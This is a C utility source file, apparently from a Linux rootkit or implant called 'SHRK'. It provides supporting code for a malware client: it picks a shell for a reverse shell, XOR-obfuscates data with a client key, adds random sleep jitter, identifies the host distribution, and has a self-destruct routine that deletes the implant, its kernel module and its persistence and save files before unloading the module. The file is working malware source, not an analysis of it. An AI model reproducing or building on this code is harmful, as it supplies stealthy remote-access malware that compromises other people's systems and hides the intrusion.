#include "inc/util.h"
#include "inc/kernel.h"
#include "inc/save.h"

#include <stdbool.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include <dirent.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <netdb.h>
#include <stdio.h>

#include <time.h>

const char *shells[] = {"fish", "zsh", "bash", "tcsh", "sh", NULL};

void print_debug(const char *func, const char *msg, ...) {
  if (!SHRK_DEBUG)
    return;

  va_list args;
  va_start(args, msg);

  printf("%s: ", func);
  vprintf(msg, args);
  printf("\n");

  va_end(args);
}

void print_debug_dump(const char *func, uint8_t *buf, uint16_t size) {
  if (!SHRK_DEBUG)
    return;

  printf("--- start of dump from %s ---\n", func);

  for (uint16_t i = 0; i < size; i++) {
    if (!(i % 10))
      printf(i != 0 ? "\n0x%04x: " : "0x%04x: ", i);

    printf("0x%02x ", buf[i]);

    if (i == size - 1)
      printf("\n");
  }

  printf("---- end of dump from %s ----\n", func);
}

uint64_t copy(void *dst, void *src, uint64_t size) {
  memcpy(dst, src, size);
  return size;
}

uint64_t randint(uint64_t min, uint64_t max) {
  return min + rand() % (max + 1 - min);
}

void randseed() {
  /*

   * teacher: i want everybody in this class to succeed
   * the kid named seed: 0_0

  */
  srand(time(NULL));
}

uint64_t xorck(char *s, uint64_t l) {
  for (uint64_t i = 0; i < l; i++)
    s[i] ^= SHRK_CLIENT_KEY[i % CLIENT_KEY_SIZE];
  return l * ENCRYPTED_BYTE_SIZE;
}

uint64_t encode(char *s, uint64_t l) {
  uint8_t cp[l];

  memcpy(cp, s, l);
  bzero(s, l);

  for (uint64_t i = 0; i < l; i++)
    sprintf(s + (i * ENCODED_BYTE_SIZE), "%02x", cp[i]);

  return l * ENCODED_BYTE_SIZE;
}

uint64_t decode(char *s, uint64_t l) {
  if ((l % ENCODED_BYTE_SIZE) != 0) {
    errno = EINVAL;
    return 0;
  }

  char *cp = s;

  for (; *s != 0; s += 2)
    sscanf(s, "%02hhx", cp++);

  return l / ENCODED_BYTE_SIZE;
}

void jitter() {
  sleep(randint(3, 5));
}

bool resolve(struct addrinfo *info, struct sockaddr *saddr, char *addr, uint16_t port) {
  if (NULL == saddr || NULL == addr) {
    errno = EINVAL;
    return false;
  }

  struct addrinfo *res = NULL, *cur = NULL;
  bool             ret = false;

  if (getaddrinfo(addr, NULL, NULL, &res) < 0)
    goto end;

  if (NULL == res)
    goto end;

  for (cur = res; cur != NULL; cur = cur->ai_next) {
    if (AF_INET == cur->ai_family || AF_INET6 == cur->ai_family)
      break;
  }

  if (NULL == cur)
    goto end;

  if (NULL != info)
    memcpy(info, cur, sizeof(struct addrinfo));
  memcpy(saddr, cur->ai_addr, sizeof(struct sockaddr));

  switch (saddr->sa_family) {
  case AF_INET:
    ((struct sockaddr_in *)saddr)->sin_port = htons(port);
    break;

  case AF_INET6:
    ((struct sockaddr_in6 *)saddr)->sin6_port = htons(port);
    break;

  default:
    errno = EPROTONOSUPPORT;
    goto end;
  }

  ret = true;
end:
  freeaddrinfo(res);
  return ret;
}

bool path_find(char *executable) {
  char    *path = strdup(getenv("PATH")), *save = NULL, *el = NULL;
  uint32_t exec_size = strlen(executable);
  bool     ret       = false;

  if (NULL == path)
    goto end;

  if ((el = strtok_r(path, ":", &save)) == NULL)
    goto end;

  do {
    char fp[strlen(el) + exec_size + 2];
    sprintf(fp, "%s/%s", el, executable);

    if (access(fp, X_OK) == 0) {
      ret = true;
      goto end;
    }
  } while ((el = strtok_r(NULL, ":", &save)) != NULL);

end:
  free(path);
  return ret;
}

char *shell_find() {
  char **shell = NULL;

  // find an available shell to execute for the reverse shell
  for (shell = (char **)shells; *shell != NULL; shell++)
    if (path_find(*shell))
      break;

  return *shell;
}

char *get_distro() {
  char    *line = NULL, *distro = NULL, *c = NULL;
  uint64_t line_size = 0;
  FILE    *distf     = NULL;

  if ((distf = fopen("/etc/os-release", "r")) == NULL)
    return NULL;

  if (getline(&line, &line_size, distf) <= 1)
    goto fail;

  /*

   * we need to parse out the first line
   * which looks like: NAME="Arch Linux"
   * so lets first get to the start of the name

  */
  for (c = line;; c++) {
    // did we reach the end?
    if (*c == 0)
      goto fail;

    // wait till we skip at least one char
    if (c == line)
      continue;

    // skip till we get to ="
    if (*c == '"' && *(c - 1) == '=') {
      distro = strdup(++c); // the line will be freed so lets just duplicate it
      break;
    }
  }

  // lets find the '"' at the end and remove it
  for (c = distro; *c != '"'; c++)
    if (*c == 0)
      goto fail;

  *c = 0;
  goto end;

fail:
  free(distro);
  distro = NULL;
end:
  free(line);
  return distro;
}

bool remove_dir(char *path) {
  struct dirent *ent      = NULL;
  DIR           *path_dir = NULL;
  char           fp[PATH_MAX + 1];
  struct stat    st;
  bool           ret = false;

  if ((path_dir = opendir(path)) == NULL)
    return false;

  while ((ent = readdir(path_dir)) != NULL) {
    if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
      continue;

    bzero(fp, PATH_MAX + 1);
    snprintf(fp, PATH_MAX + 1, "%s/%s", path, ent->d_name);

    if (stat(fp, &st) != 0)
      goto end;

    if (S_ISDIR(st.st_mode)) {
      if (!remove_dir(fp)) {
        debug_err("failed to remove dir: %s", fp);
        goto end;
      }
      continue;
    }

    if (unlink(fp) != 0) {
      debug_err("failed to remove file: %s", fp);
      goto end;
    }
  }

  ret = true;
end:
  closedir(path_dir);
  if (ret)
    return rmdir(path) == 0;
  return ret;
}

char *get_self(char *path) {
  bool allocated = false;

  if (NULL == path) {
    path      = malloc(PATH_MAX + 1);
    allocated = true;
  }

  bzero(path, PATH_MAX + 1);

  if (readlink("/proc/self/exe", path, PATH_MAX + 1) > 0)
    return path;

  if (allocated)
    free(path);

  return NULL;
}

/*

 * first it deletes itself, the kernel module, the save file and the persistence file
 * lastly unloads the kernel module

*/
void self_destruct() {
  char self[PATH_MAX + 1];

  // no need to delete anything in debug mod
  if (SHRK_DEBUG)
    return;

  // first lets remove ourself
  if (NULL == get_self(self)) {
    debug("failed to obtain self path");
    goto skip_self;
  }

  if (unlink(self) != 0) {
    debug_err("failed to unlink the self");
    return;
  }

skip_self:
  // next, lets remove the kernel module
  if (unlink(SHRK_MODULE_PATH) != 0) {
    debug_err("failed to unlink the kernel module");
    return;
  }

  // after that, remove the save file
  save_remove();

  // next, lets remove the persistence file
  if (SHRK_PERSIS_FILE[0] != 0 && unlink(SHRK_PERSIS_FILE) != 0) {
    debug_err("failed to unlink the persistence file");
    return;
  }

  kernel_unload();
}
